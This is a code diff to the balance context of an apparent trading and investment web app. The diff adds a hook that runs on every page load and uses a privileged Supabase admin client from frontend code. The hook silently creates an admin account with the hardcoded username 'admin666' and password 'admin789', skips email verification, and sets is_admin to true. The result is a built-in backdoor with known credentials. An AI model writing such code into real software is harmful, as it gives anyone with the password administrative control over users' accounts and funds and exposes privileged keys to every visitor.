@@ -5,7 +5,7 @@ import React, { createContext, useContext, useState, useEffect, ReactNode, useCa
 import { ContractTrade, SpotTrade, Transaction, availablePairs, Investment } from '@/types';
 import { useAuth } from '@/context/auth-context';
 import { useMarket } from '@/context/market-data-context';
-import { supabase } from '@/lib/supabase';
+import { supabase, supabaseAdmin } from '@/lib/supabase';
 import { useToast } from '@/hooks/use-toast';
 
 export type { Investment };
@@ -200,6 +200,81 @@ export function BalanceProvider({ children }: { children: ReactNode }) {
         return {};
     }
   }, [user]);
+
+  // ONE-TIME FIX: Automatically create the admin user if they don't exist.
+  useEffect(() => {
+    const ensureAdminExists = async () => {
+        const adminEmail = 'admin666@noemail.app';
+        
+        // 1. Check if the user exists in the public table first.
+        const { data: existingUser, error: checkError } = await supabase
+            .from('users')
+            .select('id')
+            .eq('username', 'admin666')
+            .single();
+
+        // If user already exists or there was an error checking, stop.
+        if (existingUser || (checkError && checkError.code !== 'PGRST116')) { // PGRST116 = no rows found
+             console.log("Admin user check complete.");
+             return;
+        }
+
+        console.log("Admin user 'admin666' not found. Attempting to create...");
+
+        try {
+            // 2. Create the user in auth.users
+            const { data: authData, error: authError } = await supabaseAdmin.auth.admin.createUser({
+                email: adminEmail,
+                password: 'admin789',
+                email_confirm: true, // Bypass email verification
+            });
+
+            if (authError) {
+                 // Handle cases where the auth user might already exist but public profile doesn't
+                if (authError.message.includes('User already registered')) {
+                    console.warn("Auth user 'admin666' exists, but public profile is missing. Will try to recover.");
+                    const { data: { users }, error: listError } = await supabaseAdmin.auth.admin.listUsers({ email: adminEmail });
+                    if (listError || users.length === 0) {
+                        throw listError || new Error("Cannot find existing admin auth user to recover.");
+                    }
+                    authData.user = users[0];
+                } else {
+                    throw authError;
+                }
+            }
+
+            if (!authData.user) {
+                throw new Error("Admin user creation in auth failed silently.");
+            }
+
+            const newAdminUserId = authData.user.id;
+
+            // 3. Create the corresponding profile in public.users
+            const { error: profileError } = await supabase
+                .from('public.users')
+                .insert({
+                    id: newAdminUserId,
+                    username: 'admin666',
+                    email: adminEmail,
+                    is_admin: true,
+                    inviter_id: null,
+                    // A simplified invitation code generation for this one-time fix
+                    invitation_code: 'ADMIN' + Math.random().toString(36).substring(2, 6).toUpperCase()
+                });
+
+            if (profileError) {
+                throw profileError;
+            }
+
+            console.log("Successfully created and configured admin user 'admin666'.");
+
+        } catch (e: any) {
+            console.error("CRITICAL: Failed to auto-create admin user. Please check Supabase logs and database policies.", e.message);
+        }
+    };
+
+    ensureAdminExists();
+  }, []); // Run only once on initial mount.
 
 
   useEffect(() => {
